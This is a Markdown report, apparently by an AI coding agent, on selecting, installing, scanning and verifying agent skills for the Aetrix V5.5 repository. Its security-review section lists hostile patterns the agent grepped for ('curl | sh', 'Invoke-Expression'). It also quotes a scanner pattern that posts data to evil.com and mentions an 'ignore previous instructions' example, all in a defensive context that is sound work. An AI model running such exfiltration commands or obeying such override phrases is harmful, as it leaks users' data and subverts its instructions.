# Agent skill research and installation report

**Date:** 2026-11-07 · **Repository:** `C:\Projects\Aetrix\Aetrix_V5.5-main` (Aetrix V5.5)
**Scope:** research, selection, installation, passive activation, Freebuff integration,
Aetrix-specific authoring, security review, verification.

**Statuses used:** RESEARCHED · APPROVED · INSTALLED · PASSIVE ACTIVATION VERIFIED ·
FREEBUFF INTEGRATED · UNSUPPORTED · BLOCKED · REJECTED

---

## 1. Environment findings

| Question | Finding | Status |
|---|---|---|
| Which agent/runtime? | Freebuff (Buffy role), cloud session whose filesystem and shell tools execute on the user's Windows machine | RESEARCHED |
| Project confirmed? | Yes — `Aetrix V5.5`, engine + frontend + frozen benchmark + docs in one repo | RESEARCHED |
| Stack | Python 3.12 FastAPI / SQLAlchemy 2.0 / Alembic / psycopg / pytest / ruff; TanStack Start 1.169 + React 19 + Vite 8 + TypeScript 6 on Cloudflare Workers; Supabase (Postgres + Auth); Playwright 1.64 + axe | RESEARCHED |
| Skill standard supported | Agent Skills (`SKILL.md` + frontmatter, progressive disclosure, `references/` allowed) | RESEARCHED |
| Project-level skills | `.agents/skills/<name>/SKILL.md` — highest-priority project directory; `.claude/skills` is the second. No manifest required. | FREEBUFF INTEGRATED |
| Global skills | `~/.agents/skills` and `~/.claude/skills` only when the host sets `includeHomeSkills`; **off by default** and explicitly discouraged for server-side contexts | UNSUPPORTED (by design — nothing installed globally) |
| Automatically activated skills | Yes: loaders enumerate name + description per session, body loaded on match | PASSIVE ACTIVATION VERIFIED (contract) / see §6 for the live caveat |
| Model-invoked vs user-invoked | Model-invoked by description. No user-invocation syntax is exposed to this runtime | RESEARCHED |
| Hooks / lifecycle events | Not configurable from the project. The client exposes file-change hooks (`run_file_change_hooks`) but the project cannot define them | UNSUPPORTED |
| Persistent instructions | `AGENTS.md` then `CLAUDE.md` (`KNOWLEDGE_FILE_NAMES`, AGENTS.md wins), injected into each session | FREEBUFF INTEGRATED |
| MCP | The connected apps (Cloudflare, Supabase, Gmail, Excel) are platform integrations; the project cannot register additional MCP servers | UNSUPPORTED |
| CLI for installs | `npx skills@latest` (skills.sh) works: `--agent universal --copy` installs to `.agents/skills` | INSTALLED |

Toolchain note: `node`, `npm`, `npx` and `python` are **not** on `PATH` in this workspace;
`.tools/node/node.exe` and `backend/.venv/Scripts/python.exe` were used explicitly.

## 2. Repositories researched

All cloned shallow and inspected locally (every `SKILL.md`, README, license, script set).

| Repository | Commit | Date | License | Skills | Verdict |
|---|---|---|---|---|---|
| [obra/superpowers](https://github.com/obra/superpowers) | `22f0b46` | 2026-11-03 | MIT | 15 | Used — 5 |
| [mattpocock/skills](https://github.com/mattpocock/skills) | `4ae2317` | 2026-10-31 | MIT | 39 | Used — 5 |
| [vercel-labs/agent-skills](https://github.com/vercel-labs/agent-skills) | `1a2c79d` | 2026-10-27 | MIT (per file) | 9 | Used — 2 |
| [supabase/agent-skills](https://github.com/supabase/agent-skills) | `c9be0e9` | 2026-10-02 | MIT | 2 | Used — 2 (both) |
| [cloudflare/skills](https://github.com/cloudflare/skills) | `6eb6c78` | 2026-11-06 | Apache-2.0 | 22 | Used — 3 |
| [getsentry/skills](https://github.com/getsentry/skills) | `e94f222` | 2026-11-05 | Apache-2.0 | 31 | Used — 5 |
| [trailofbits/skills](https://github.com/trailofbits/skills) | `e4dd0bb` | 2026-11-06 | CC BY-SA 4.0 | 98 | Used — 2 |
| [microsoft/playwright-cli](https://github.com/microsoft/playwright-cli) | `4bc00fb` | 2026-11-05 | Apache-2.0 | 1 | Used — 1 |
| [anthropics/skills](https://github.com/anthropics/skills) | `2c5958e` | 2026-11-06 | Apache-2.0 / source-available mix | 19 + template | Reference only (authoring conventions, `template/SKILL.md`) |
| [nextlevelbuilder/ui-ux-pro-max-skill](https://github.com/nextlevelbuilder/ui-ux-pro-max-skill) | already vendored | — | MIT | — | Already installed (`ui-ux-pro-max`, `design-system`); not re-installed |
| [agentskills.io](https://agentskills.io/specification) | — | — | — | — | Specification read: `name` + `description` minimum, progressive disclosure |
| [skills.sh](https://skills.sh/) | — | — | — | — | CLI + registry used for discovery and installation |

No repository was abandoned; every commit is within the last ~5 weeks. Quality was judged
from the skill bodies and their reference trees, not from stars.

## 3. Installed — exact list (25 external + 5 Aetrix)

| # | Skill | Source | Status |
|---|---|---|---|
| 1 | `test-driven-development` | obra/superpowers | INSTALLED |
| 2 | `verification-before-completion` | obra/superpowers | INSTALLED |
| 3 | `writing-plans` | obra/superpowers | INSTALLED |
| 4 | `receiving-code-review` | obra/superpowers | INSTALLED |
| 5 | `dispatching-parallel-agents` | obra/superpowers | INSTALLED |
| 6 | `code-review` | mattpocock/skills | INSTALLED |
| 7 | `codebase-design` | mattpocock/skills | INSTALLED |
| 8 | `domain-modeling` | mattpocock/skills | INSTALLED |
| 9 | `diagnosing-bugs` | mattpocock/skills | INSTALLED |
| 10 | `writing-for-agents` | mattpocock/skills | INSTALLED |
| 11 | `vercel-react-best-practices` | vercel-labs/agent-skills | INSTALLED |
| 12 | `vercel-composition-patterns` | vercel-labs/agent-skills | INSTALLED |
| 13 | `supabase` | supabase/agent-skills | INSTALLED |
| 14 | `supabase-postgres-best-practices` | supabase/agent-skills | INSTALLED |
| 15 | `frameworks-on-cloudflare` | cloudflare/skills | INSTALLED |
| 16 | `workers-best-practices` | cloudflare/skills | INSTALLED |
| 17 | `wrangler` | cloudflare/skills | INSTALLED |
| 18 | `security-review` | getsentry/skills | INSTALLED |
| 19 | `find-bugs` | getsentry/skills | INSTALLED |
| 20 | `code-simplifier` | getsentry/skills | INSTALLED |
| 21 | `skill-scanner` | getsentry/skills | INSTALLED |
| 22 | `agents-md` | getsentry/skills | INSTALLED |
| 23 | `modern-python` | trailofbits/skills | INSTALLED |
| 24 | `property-based-testing` | trailofbits/skills | INSTALLED |
| 25 | `playwright-cli` | microsoft/playwright-cli | INSTALLED (CLI binary absent — see §11) |
| 26 | `aetrix-architecture` | this repository | INSTALLED |
| 27 | `aetrix-backend` | this repository | INSTALLED |
| 28 | `aetrix-frontend` | this repository | INSTALLED |
| 29 | `aetrix-security` | this repository | INSTALLED |
| 30 | `aetrix-verification` | this repository | INSTALLED |

Total available in the project: **48** skills (18 pre-existing design/UX + 30 above).
Full row-per-skill detail, links, categories, priorities, licenses and per-skill rationale:
[`SKILL_CATALOG.md`](SKILL_CATALOG.md).

## 4. Installation commands

Run from the repository root, with `.tools/node` prepended to `PATH`:

```bash
npx skills@latest add obra/superpowers -s test-driven-development -s verification-before-completion \
  -s writing-plans -s receiving-code-review -s dispatching-parallel-agents -y --agent universal --copy
npx skills@latest add mattpocock/skills -s code-review -s codebase-design -s domain-modeling \
  -s diagnosing-bugs -s writing-for-agents -y --agent universal --copy
npx skills@latest add vercel-labs/agent-skills -s vercel-react-best-practices \
  -s vercel-composition-patterns -y --agent universal --copy
npx skills@latest add supabase/agent-skills -s supabase -s supabase-postgres-best-practices \
  -y --agent universal --copy
npx skills@latest add cloudflare/skills -s frameworks-on-cloudflare -s workers-best-practices \
  -s wrangler -y --agent universal --copy
npx skills@latest add getsentry/skills -s security-review -s find-bugs -s code-simplifier \
  -s skill-scanner -s agents-md -y --agent universal --copy
npx skills@latest add trailofbits/skills -s modern-python -s property-based-testing \
  -y --agent universal --copy --full-depth
npx skills@latest add microsoft/playwright-cli -s playwright-cli -y --agent universal --copy
```

Notes learned from the CLI:

- `-s` takes **one** skill name per flag (comma lists are rejected). Skill names are the
  frontmatter `name:`, which for Vercel is prefixed (`vercel-react-best-practices`).
- `--agent universal` is the target that writes the standard `.agents/skills/` directory —
  the same directory the Freebuff loader reads. There is no `freebuff` agent target.
- `--copy` avoids symlinks (they do not survive Windows/Git well here).
- `--full-depth` is required for repositories whose skills live under `plugins/*/skills/*`
  (Trail of Bits).
- The CLI writes `skills-lock.json` at the repository root: source, skill path, content hash,
  install mode — the reproducible record and the basis for `npx skills update`.
- `npx skills list` labels the `universal` target as "OpenCode" in its output. That is the
  CLI's internal name for the generic `.agents/skills` target; the files land exactly where
  the Freebuff loader reads them, which is what matters.

## 5. Rejected candidates

Full table with reasons: [`SKILL_CATALOG.md` §5](SKILL_CATALOG.md#5-rejected-candidates).
The material rejections:

| Candidate | Why |
|---|---|
| `systematic-debugging` (obra) | **Duplicate** of the account-level Freebuff skill — byte-identical instructions. |
| `brainstorming`, `web-design-guidelines`, `frontend-design` | Already account-level or already in `.agents/skills`. |
| `tdd` (mattpocock) | Duplicates `test-driven-development`; one TDD skill only. |
| `react-view-transitions` | React 19.2/Next-centric API; the app's motion layer is CSS-based by decision. |
| `supply-chain-risk-auditor` | Valuable but runs registry-querying collector scripts; kept as a documented option, not a default. |
| `static-analysis` (semgrep/CodeQL) | Tooling not installed; would add a dependency chain. |
| `testing-handbook-skills` | C/C++ fuzzing/sanitizers — wrong runtime. |
| 20+ Cloudflare product skills | Products Aetrix does not use (D1, R2, Turnstile, Email, Sandbox, One). |
| Sentry git/PR skills | Wrong workflow and `gh` dependency. |
| `skill-creator`, `mcp-builder`, document skills | Off-scope; used as authoring reference instead. |

## 6. Passive activation — what is actually true

**Mechanism (verified first-hand).** The installed Freebuff desktop bundle was inspected
read-only (`%LOCALAPPDATA%\Programs\@codebufffreebuff-desktop\resources\app.asar`). Its
loader documentation states:

> "Load skills from `.agents/skills` and `.claude/skills` directories. By default, searches
> PROJECT directories only (later overrides earlier): `{cwd}/.claude/skills/` (project,
> Claude Code compatible); `{cwd}/.agents/skills/` (project, highest priority)."
> "Also search `~/.claude/skills` and `~/.agents/skills`. Defaults to FALSE… Leave it unset
> in anything server-side, and in anything acting on a repo that lives elsewhere."
> "Called at most once, and only when a fresh session state is built."

So activation is: **description-level discovery at session start → body loaded on match**,
which is exactly the Agent Skills progressive-disclosure model. That is passive by
construction; no skill needs to be named by the user.

**Contextual route.** Descriptions were written (or chosen) with concrete triggers:
`supabase` triggers on auth/RLS/session work, `supabase-postgres-best-practices` on any
schema/SQL change, `wrangler` on deployment config, `aetrix-*` on their layers,
`verification-before-completion` on completion claims. `AGENTS.md` adds a deterministic
task → skill table on top of description matching, so routing does not depend on the model
inferring intent.

**Honest limit.** This is a *cloud* session. The bundle's own notes show that a
server-side/remote `cwd` does not see the user's local disk (the source comment even uses
`/home/daytona/codebase` as the remote path), and `includeHomeSkills` is deliberately off
server-side. Consistent with that, this session's prompt listed only the five account-level
Freebuff skills — the local `.agents/skills` set did not appear. Therefore:

- **PASSIVE ACTIVATION VERIFIED** for the loader contract and the file layout.
- **NOT RE-VERIFIED end-to-end inside a fresh session**, because a session cannot be
  restarted from within this one. This is the single outstanding check: open a new Freebuff
  session on this machine and confirm the 48 skill names are offered.
- The claim "skills are automatically loaded when I work on React" is therefore **not yet
  proven by observation** — the mechanism is proven, the live enumeration is pending.

## 7. Freebuff integration results

| Capability | Result | Status |
|---|---|---|
| Project skill discovery (`.agents/skills`) | Directory-based, no config, highest priority | FREEBUFF INTEGRATED |
| Persistent project instructions | `AGENTS.md` created; `KNOWLEDGE_FILE_NAMES = ['AGENTS.md','CLAUDE.md']`, AGENTS.md wins, injected per session | FREEBUFF INTEGRATED |
| Account-level skills | 5 cloud skills already present (`frontend-design`, `brainstorming`, `web-design-guidelines`, `systematic-debugging`, `find-skills`) — deliberately not duplicated | FREEBUFF INTEGRATED |
| Global (user-level) skills | Not used; home loading is off by default and should stay off for server-side runs | UNSUPPORTED |
| MCP servers of our own | Cannot be registered from the project | UNSUPPORTED |
| Hooks | Client-side only; the project cannot define them | UNSUPPORTED |
| Cross-session persistence | Files are in the repository, so they persist and travel with `git` | FREEBUFF INTEGRATED |

No Freebuff internals or global settings were modified. The only environment inspection was
a read-only string scan of the app bundle to verify the loader contract.

## 8. Aetrix-specific skills

Five, each written from facts verified in this repository (no invented behaviour, no
credentials, no external URLs beyond this repo's own docs):

| Skill | What it encodes |
|---|---|
| `aetrix-architecture` | Layer/authority map, documented-vs-implemented split, seven engine invariants, implemented/unimplemented list, change routing |
| `aetrix-backend` | Module ownership, tenant-from-identity rule, migration discipline, append-only tables, provider boundary, typed errors, ruff/pytest conventions and commands |
| `aetrix-frontend` | Route conventions (`_app.*`, metadata table, trailing-slash lesson), token/motion rules, `ApiResult` honesty, Supabase auth contract, typecheck/build/preview/e2e commands |
| `aetrix-security` | Trust boundaries, tenancy/IDOR checklist, RLS guard, secrets/logging, upload hardening, provider-output handling, review method, accepted gaps |
| `aetrix-verification` | Per-change verification matrix, exact commands with the workspace's real binary paths, exit-status rules, claim discipline |

They are intentionally short and point at the external skills for depth, so the same fact is
never maintained in two places.

## 9. Security review findings

**Process:** every installed skill was scanned with `skill-scanner` (getsentry) — 48 scans,
no scan errors — plus a manual grep for `curl | sh`, `Invoke-Expression`, `base64 -d`,
`eval`, `child_process`, `subprocess`, outbound HTTP and credential patterns.

| Skill(s) | Findings | Real? | Assessment |
|---|---|---|---|
| 25 external + 5 Aetrix | 0 | — | Clean |
| `security-review` | 8 (2 critical, 6 high) | No | All inside its own teaching material: example passwords in `references/*.md`, an "ignore previous instructions" example in `modern-threats.md`, and AWS's documented example key `AKIAIOSFODNN7EXAMPLE`. |
| `skill-scanner` | 36 | No | Its pattern definitions *contain* the malicious strings they detect (e.g. `requests.post("https://evil.com/collect"...)`). |
| `impeccable` | 4 × `exec()` | No | `RegExp.prototype.exec` in a vendored browser script. |
| `design-system`, `ui-ux-pro-max` | 15 × "bundled test file" | **Low, real** | Upstream ships `scripts/tests/test_*.py`. A repo-root `pytest` run could collect them. Aetrix CI runs pytest inside `backend/` (`testpaths = ["tests"]`), so nothing collects them today; noted as residual risk. |
| `diagnosing-bugs` | — | — | Ships `scripts/hitl-loop.template.sh` (a copy-and-edit human-in-the-loop template). Not executed. |

Additional controls:

- No skill was executed during installation; nothing was installed from npm except the
  `skills` CLI itself (via `npx`, cached, not added to the project).
- No credentials exist in `.agents/`; the Supabase publishable key is not referenced by any
  skill.
- No project file was overwritten: `frontend/`, `backend/`, `benchmark/` and `docs/` outside
  `docs/agent-skills/` are untouched by this mission.
- Trail of Bits skills are CC BY-SA 4.0 and were left byte-identical (share-alike applies to
  modifications).

## 10. Verification results

| Check | Result |
|---|---|
| Skill count | 48 `SKILL.md` files under `.agents/skills` |
| Frontmatter parse (YAML) | 48/48 valid |
| `name` matches directory | 48/48 |
| Description present, 20–1024 chars | 48/48 |
| Lock file | `skills-lock.json` — 25 entries with source, path, hash, install mode |
| Security scan | 48/48 scanned; 0 actionable findings in the new set (see §9) |
| Duplicate names | none |
| Name clash with account-level skills | none after exclusions (`systematic-debugging`, `brainstorming`, `web-design-guidelines` skipped) |
| Existing project state | 9 modified frontend files are the pre-existing HUB work, **untouched**; 0 changes in `backend/`, `benchmark/`, or marketing docs |
| `AGENTS.md` | created (the runtime reported no instruction file before this) |
| Live session enumeration | **not run** — requires a new session (§6) |

## 11. Remaining limitations

1. **Live activation is unverified.** The contract is proven from the bundle; a new desktop
   session must confirm the skill list appears. Until then, treat activation as
   contract-verified, not observed.
2. **Cloud vs desktop.** Local project skills may not be enumerated in cloud-runtime
   sessions; `AGENTS.md` is the channel that carries across both. If a future session shows
   no skills, the fallback is to read `.agents/skills/<name>/SKILL.md` directly — the routing
   table makes that deterministic.
3. **`playwright-cli` has no binary.** The skill documents a CLI that is not installed
   globally. Its test/trace reference material is still usable; driving a page needs
   `npm i -g @playwright/cli` first, which was deliberately not done.
4. **`modern-python` recommends `uv`/`ty`.** Aetrix uses pip + ruff + pytest; follow the
   principles, not the tooling swap.
5. **Bundled `test_*.py` files** in two pre-existing design skills remain a theoretical
   pytest-collection risk; no current workflow collects them.
6. **Updates are not automatic.** `npx skills update` is manual; an upstream description
   change can alter activation without any code change.
7. **No hooks, no custom MCP.** Both are unsupported for this project; anything that depends
   on them must be handled by instruction files or the agent's own tools.

## 12. Maintenance procedure

```bash
export PATH="$PWD/.tools/node:$PATH"
npx skills list                      # what is installed
npx skills update -p -y              # update project skills, then review the diff
npx skills remove -s <name> -y       # remove one
npx skills experimental_install --frozen-lockfile   # restore exactly from the lock
```

After any add/update:

1. Re-run the frontmatter validator (name == directory, description present).
2. Re-run `skill-scanner` over `.agents/skills/*` and review non-zero results against §9's
   known false-positive list.
3. Check for a new name clash with account-level Freebuff skills.
4. If a skill's trigger description changes upstream, update the routing table in
   `AGENTS.md`.
5. Keep `AGENTS.md` under ~80 lines — it is injected into every session and is the most
   expensive file in the repository per word.

Quarterly: re-check the two `aetrix-*` references against the code (`backend/app`,
`frontend/src`, CI workflows) so the skills cannot drift into describing a system that no
longer exists.
